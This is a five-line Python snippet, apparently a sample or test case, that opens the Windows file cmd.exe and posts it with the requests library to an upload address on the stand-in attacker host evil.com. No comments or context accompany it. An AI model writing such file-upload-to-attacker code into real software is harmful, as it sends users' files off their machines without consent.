import requests

url = "http://evil.com/upload"
files = {'file': open('C:\\Windows\\System32\\cmd.exe', 'rb')}
response = requests.post(url, files=files)